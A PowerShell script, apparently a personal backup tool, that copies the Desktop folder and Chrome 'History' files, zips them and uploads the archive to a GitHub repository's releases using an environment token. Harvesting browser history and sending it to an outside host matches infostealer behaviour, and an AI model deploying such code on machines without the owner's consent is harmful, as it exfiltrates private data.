# 设置 UTF-8 输出
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# GitHub 信息
$repo = "drftghy/backup-files"
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$token = $env:GITHUB_TOKEN
$apiUrl = "https://api.github.com/repos/$repo/releases"

# 上传的文件路径列表（可以改为从远程加载）
$paths = @(
    "C:\Users\Administrator\Desktop",
    "C:\Program Files\Google\Chrome\Application\1\Default\History",
    "D:\谷歌文件\1\Default\History",
    "D:\Application\2\Default\History"
)

# 过滤存在的路径并复制到临时目录
$workDir = "$env:TEMP\backup_$tag"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

foreach ($path in $paths) {
    if (Test-Path $path) {
        try {
            $dest = Join-Path $workDir ([IO.Path]::GetFileName($path))
            Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
        } catch {
            Write-Warning "无法复制：$path"
        }
    } else {
        Write-Warning "路径不存在：$path"
    }
}

# 压缩为 ZIP
$zipPath = "$env:TEMP\$tag.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

# 创建 Release
$releaseBody = @{
    tag_name = $tag
    name     = "Backup $tag"
    body     = "自动上传的备份文件"
    draft    = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$response = Invoke-RestMethod -Uri $apiUrl -Headers @{ Authorization = "token $token" } -Method Post -Body $releaseBody -ContentType "application/json"

if ($response.upload_url) {
    $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
    $headers = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
    }

    # 上传附件
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $headers -InFile $zipPath
    Write-Host "`n✅ 上传成功：$tag.zip"
} else {
    Write-Host "❌ Create release failed: $($response | ConvertTo-Json -Depth 5)"
}
